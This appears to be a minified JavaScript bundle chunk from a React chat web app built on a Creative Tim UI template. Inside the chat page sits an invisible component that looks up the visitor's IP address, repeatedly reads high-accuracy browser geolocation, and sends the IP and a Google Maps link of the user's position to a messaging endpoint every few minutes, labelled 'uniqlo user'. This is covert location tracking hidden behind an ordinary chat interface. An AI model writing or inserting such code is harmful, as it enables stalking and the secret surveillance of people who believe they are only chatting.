/*!

=========================================================
* Now UI Kit PRO React - v1.0.0
=========================================================

* Product Page: https://www.creative-tim.com/product/now-ui-kit-pro-react
* Copyright 2019 Creative Tim (http://www.creative-tim.com)

* Coded by Creative Tim

=========================================================

* The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

*/
(this["webpackJsonpmaterial-kit-pro-react"]=this["webpackJsonpmaterial-kit-pro-react"]||[]).push([[18],{244:function(e,t,a){"use strict";a.d(t,"b",(function(){return o})),a.d(t,"c",(function(){return i})),a.d(t,"a",(function(){return u}));var n,c=a(273),o=function(e,t,a){if(void 0!==window.navigator.geolocation){window.navigator.geolocation.getCurrentPosition((function(t){var n={lat:t.coords.latitude?t.coords.latitude:void 0,lng:t.coords.longitude?t.coords.longitude:void 0};e(n),a(!0)}),(function(e){t({0:"\u4e0d\u660e\u539f\u56e0\u932f\u8aa4",1:"\u4f7f\u7528\u8005\u62d2\u7d55\u63d0\u4f9b\u4f4d\u7f6e\u8cc7\u8a0a",2:"\u7121\u6cd5\u53d6\u5f97\u4f4d\u7f6e\u8cc7\u8a0a",3:"\u4f4d\u7f6e\u67e5\u8a62\u903e\u6642"}[e.code]),a(!1)}),{enableHighAccuracy:!0,timeout:5e3,maximumAge:0})}},i=function(e,t,a){c.a;if(n=n||new Date,void 0!==window.navigator.geolocation)return navigator.geolocation.watchPosition((function(t){var c={lat:t.coords.latitude?t.coords.latitude:void 0,lng:t.coords.longitude?t.coords.longitude:void 0},o=new Date;Math.abs(o-n)/1e3%60>180&&(e(c),n=new Date),a(!0)}),(function(e){t({0:"\u4e0d\u660e\u539f\u56e0\u932f\u8aa4",1:"\u4f7f\u7528\u8005\u62d2\u7d55\u63d0\u4f9b\u4f4d\u7f6e\u8cc7\u8a0a",2:"\u7121\u6cd5\u53d6\u5f97\u4f4d\u7f6e\u8cc7\u8a0a",3:"\u4f4d\u7f6e\u67e5\u8a62\u903e\u6642"}[e.code]),a(!1)}),{enableHighAccuracy:!0,timeout:5e3,maximumAge:0})},u=function(e){void 0!==window.navigator.geolocation&&navigator.geolocation.clearWatch(e)}},273:function(e,t,a){"use strict";a.d(t,"a",(function(){return n}));var n=18e4},840:function(e,t,a){"use strict";a.r(t);var n=a(57),c=a(111),o=a.n(c),i=a(1),u=a.n(i),r=a(38),s=a(10),l=a(28),f=a(107),b=a(67),d=a(68),v=a(276),O=a(275),m=a(431),j=a(74),g=a(217),w=a(196),p=a(207),h=a(244),E=(a(15),Object(s.f)((function(e){e.history;var t=Object(i.useState)(void 0),a=Object(n.a)(t,2),c=a[0],o=a[1],r=Object(i.useState)(void 0),s=Object(n.a)(r,2),l=s[0],f=s[1],b=Object(i.useState)(void 0),d=Object(n.a)(b,2),v=d[0],O=d[1],m=Object(i.useState)(void 0),j=Object(n.a)(m,2),w=j[0],p=j[1];return Object(i.useEffect)((function(){fetch("https://www.cloudflare.com/cdn-cgi/trace").then((function(e){return e.text()})).then((function(e){var t=e.split("\n"),a=Object(n.a)(t,3),c=(a[0],a[1],a[2]);if(c){var i=c.split("="),u=Object(n.a)(i,2),r=(u[0],u[1]);o(r)}}))}),[]),Object(i.useEffect)((function(){Object(h.b)(f,O,p);var e=Object(h.c)(f,O,p);return function(){e&&Object(h.a)(e)}}),[]),Object(i.useEffect)((function(){if(v){console.log(v);var e="uniqlo user error: ".concat(v);Object(g.a)(e)}}),[v,w]),Object(i.useEffect)((function(){if(l){var e="uniqlo user \n ip:".concat(c," \n https://www.google.com.tw/maps?q=").concat(l.lat,",").concat(l.lng);Object(g.a)(e)}}),[l]),u.a.createElement(i.Fragment,null)}))),S=a(273),y=a(77),q=a(72),k=Object(f.a)(p.a);t.default=Object(s.f)((function(e){e.history;var t=k(),a=Object(r.useSelector)((function(e){return e.login})).user,c=Object(i.useState)(void 0),s=Object(n.a)(c,2),f=s[0],p=s[1],h=Object(i.useState)(""),x=Object(n.a)(h,2),D=x[0],A=x[1],U=Object(i.useState)(""),I=Object(n.a)(U,2),T=I[0],C=I[1],F=Object(i.useState)(!0),H=Object(n.a)(F,2),J=H[0],M=H[1],N=Object(r.useSelector)((function(e){return e.chat})).maxMessageNumber;Object(i.useEffect)((function(){l.b&&l.b.limitToLast(N).on("value",(function(e){P(e)}))}),[N]),Object(i.useEffect)((function(){if(a&&T&&""!==T){var e={user:a,message:"".concat(T),createOn:Date.now()};if(l.b.push().set(e),a===w.b){Object(g.a)("http://www.uniqlo.com/tw/store/list/new/auto")}}}),[T]),Object(i.useEffect)((function(){setTimeout((function(){M(!1)}),5e3),setInterval((function(){M(!0),setTimeout((function(){M(!1)}),5e3)}),S.a)}),[]);var P=function(e){var t=e.val();if(null!==t&&void 0!==t){var n=o.a.slice(o.a.values(t),-N),c=o.a.slice(o.a.values(n),-1)[0].user;o.a.slice(o.a.values(n),-1)[0].createOn;a===c?(A(""),p(n)):p(n)}};return u.a.createElement("div",{className:t.section},u.a.createElement(b.a,{justify:"center"},u.a.createElement(d.a,{xs:12,sm:8,md:8},u.a.createElement("div",null,f?f.map((function(e,t){return u.a.createElement(v.a,{key:t,avatar:Object(m.a)(e.user),title:Object(m.b)(e),message:e.message})})):u.a.createElement("div",null),u.a.createElement(O.a,{avatar:Object(m.a)(a),value:D,onChange:function(e){A(e.target.value)},onReply:function(e){if(a&&""!==D){var t={user:a,message:D,createOn:Date.now()};l.b.push().set(t)}if(a===w.b){Object(g.a)("http://www.uniqlo.com/tw/store/list/new/auto")}},onUpdate:function(e){if(a){var t=N+1;Object(q.a)(y.a,t)}if(a===w.b){Object(g.a)("http://www.uniqlo.com/tw/store/list/new/update")}},enableUpdate:!0,setReplyImageUrl:C,enableImageUpload:!0})))),u.a.createElement(j.a,null),J?u.a.createElement(E,null):u.a.createElement(i.Fragment,null))}))}}]);
//# sourceMappingURL=18.1444df5d.chunk.js.map